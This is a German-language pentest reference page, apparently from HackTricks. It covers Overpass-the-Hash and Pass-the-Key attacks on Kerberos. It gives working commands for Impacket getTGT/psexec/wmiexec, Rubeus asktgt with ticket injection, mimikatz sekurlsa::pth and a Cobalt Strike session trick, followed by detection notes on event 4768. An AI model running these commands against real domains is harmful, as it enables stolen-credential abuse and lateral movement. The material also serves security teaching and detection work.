# Over Pass the Hash/Pass the Key

{{#include ../../banners/hacktricks-training.md}}


## Overpass The Hash/Pass The Key (PTK)

Der **Overpass The Hash/Pass The Key (PTK)**-Angriff ist für Umgebungen konzipiert, in denen das herkömmliche NTLM-Protokoll eingeschränkt ist und die Kerberos-Authentifizierung Vorrang hat. Dieser Angriff nutzt den NTLM-Hash oder die AES-Schlüssel eines Benutzers, um Kerberos-Tickets anzufordern, und ermöglicht so den unbefugten Zugriff auf Ressourcen innerhalb eines Netzwerks.

Genau genommen:

- **Over-Pass-the-Hash** bezeichnet normalerweise die Umwandlung des **NT-Hashs** in ein Kerberos-TGT über den **RC4-HMAC**-Kerberos-Schlüssel.
- **Pass-the-Key** ist die allgemeinere Variante, bei der bereits ein Kerberos-Schlüssel wie **AES128/AES256** vorhanden ist und damit direkt ein TGT angefordert wird.

Dieser Unterschied ist in gehärteten Umgebungen relevant: Wenn **RC4 deaktiviert** ist oder vom KDC nicht mehr vorausgesetzt wird, reicht der **NT-Hash allein nicht aus**, und du benötigst einen **AES-Schlüssel** (oder das Klartextpasswort, um diesen abzuleiten).

Um diesen Angriff auszuführen, besteht der erste Schritt darin, den NTLM-Hash oder das Passwort des Kontos des Zielbenutzers zu erlangen. Sobald diese Information gesichert wurde, kann ein Ticket Granting Ticket (TGT) für das Konto angefordert werden, wodurch der Angreifer auf Dienste oder Computer zugreifen kann, für die der Benutzer Berechtigungen besitzt.

Der Vorgang kann mit den folgenden Befehlen gestartet werden:<sup>[[1]](#references)</sup>
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
Für Szenarien, die AES256 erfordern, kann die Option `-aesKey [AES key]` verwendet werden:<sup>[[1]](#references)</sup>
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -aesKey <AES256_HEX>
export KRB5CCNAME=velociraptor.ccache
python wmiexec.py -k -no-pass jurassic.park/velociraptor@labwws02.jurassic.park
```
`getTGT.py` unterstützt außerdem das direkte Anfordern eines **service ticket über eine AS-REQ** mit `-service <SPN>`, was nützlich sein kann, wenn du ein Ticket für einen bestimmten SPN ohne eine zusätzliche TGS-REQ benötigst:
```bash
python getTGT.py -dc-ip 10.10.10.10 -aesKey <AES256_HEX> -service cifs/labwws02.jurassic.park jurassic.park/velociraptor
```
Darüber hinaus kann das erworbene Ticket mit verschiedenen Tools verwendet werden, darunter `smbexec.py` oder `wmiexec.py`, wodurch der Umfang des Angriffs erweitert wird.

Probleme wie _PyAsn1Error_ oder _KDC cannot find the name_ lassen sich typischerweise durch eine Aktualisierung der Impacket-Bibliothek oder die Verwendung des Hostnamens anstelle der IP-Adresse beheben, wodurch die Kompatibilität mit dem Kerberos-KDC sichergestellt wird.

Eine alternative Befehlssequenz mit Rubeus.exe demonstriert einen weiteren Aspekt dieser Technik:<sup>[[1]](#references)</sup>
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
Diese Methode entspricht dem Ansatz **Pass the Key**, wobei der Schwerpunkt auf der Übernahme und direkten Nutzung des Tickets zur Authentifizierung liegt. In der Praxis:

- `Rubeus asktgt` sendet die **rohe Kerberos-AS-REQ/AS-REP** selbst und benötigt keine Administratorrechte, außer wenn du mit `/luid` eine andere Anmeldesitzung ansprechen oder mit `/createnetonly` eine separate erstellen möchtest.<sup>[[2]](#references)</sup>
- `mimikatz sekurlsa::pth` injiziert Anmeldeinformationsmaterial in eine Anmeldesitzung und greift daher auf **LSASS** zu. Dafür sind normalerweise lokale Administratorrechte oder `SYSTEM` erforderlich, außerdem ist dieses Vorgehen aus EDR-Sicht auffälliger.

Beispiele mit Mimikatz:
```bash
sekurlsa::pth /user:velociraptor /domain:jurassic.park /ntlm:2a3de7fe356ee524cc9f3d579f2e0aa7 /run:cmd.exe
sekurlsa::pth /user:velociraptor /domain:jurassic.park /aes256:<AES256_HEX> /run:cmd.exe
```
Um der Operational Security zu entsprechen und AES256 zu verwenden, kann der folgende Befehl angewendet werden:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
`/opsec` ist relevant, weil sich von Rubeus erzeugter Traffic geringfügig von nativem Windows-Kerberos unterscheidet. Beachte außerdem, dass `/opsec` für **AES256**-Traffic vorgesehen ist; die Verwendung mit RC4 erfordert normalerweise `/force`, wodurch ein großer Teil des Zwecks zunichtegemacht wird, da **RC4 in modernen Domänen selbst ein starkes Signal ist**.

## Hinweise zur Erkennung

Jede TGT-Anforderung erzeugt **event `4768`** auf dem DC. In aktuellen Windows-Builds enthält dieses Event mehr nützliche Felder, als in älteren Write-ups erwähnt werden:

- `TicketEncryptionType` gibt an, welcher Enctype für das ausgestellte TGT verwendet wurde. Typische Werte sind `0x17` für **RC4-HMAC**, `0x11` für **AES128** und `0x12` für **AES256**.<sup>[[3]](#references)</sup>
- Aktualisierte Events enthalten außerdem `SessionKeyEncryptionType`, `PreAuthEncryptionType` und die vom Client angekündigten Enctypes. Dies hilft dabei, eine **tatsächliche RC4-Abhängigkeit** von verwirrenden Legacy-Defaults zu unterscheiden.
- Das Auftreten von `0x17` in einer modernen Umgebung ist ein guter Hinweis darauf, dass das Konto, der Host oder der KDC-Fallback-Pfad weiterhin RC4 erlaubt und daher für NT-Hash-basiertes Over-Pass-the-Hash besser geeignet ist.

Microsoft reduziert das RC4-Verhalten als Default schrittweise seit den Kerberos-Hardening-Updates vom November 2022. Die aktuell veröffentlichte Richtlinie empfiehlt, **RC4 bis zum Ende des zweiten Quartals 2026 als standardmäßig angenommenen Enctype für AD DCs zu entfernen**. Aus offensiver Sicht bedeutet dies, dass **Pass-the-Key mit AES** zunehmend der zuverlässige Weg ist, während klassisches **NT-hash-only OpTH** in gehärteten Umgebungen immer häufiger fehlschlagen wird.<sup>[[3]](#references)</sup>

Weitere Informationen zu Kerberos-Verschlüsselungstypen und damit zusammenhängendem Ticketing-Verhalten findest du hier:

{{#ref}}
kerberos-authentication.md
{{#endref}}

## Weniger auffällige Variante

> [!WARNING]
> Jede Anmeldesitzung kann jeweils nur ein aktives TGT haben, sei daher vorsichtig.

1. Erstelle mit **`make_token`** aus Cobalt Strike eine neue Anmeldesitzung.
2. Verwende anschließend Rubeus, um ein TGT für die neue Anmeldesitzung zu erzeugen, ohne die bestehende zu beeinflussen.

Eine ähnliche Isolation kannst du direkt mit Rubeus über eine separate **logon type 9**-Sitzung erreichen:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES256_HEX> /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
Dies verhindert das Überschreiben des aktuellen Session-TGT und ist in der Regel sicherer, als das Ticket in deine bestehende Logon-Session zu importieren.

## References

- [1] [Tarlogic - Kerberos (II): ¿Cómo atacar Kerberos?](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)
- [2] [GhostPack - Rubeus (GitHub repository)](https://github.com/GhostPack/Rubeus)
- [3] [Microsoft Learn - Detect and Remediate RC4 Usage in Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)

{{#include ../../banners/hacktricks-training.md}}
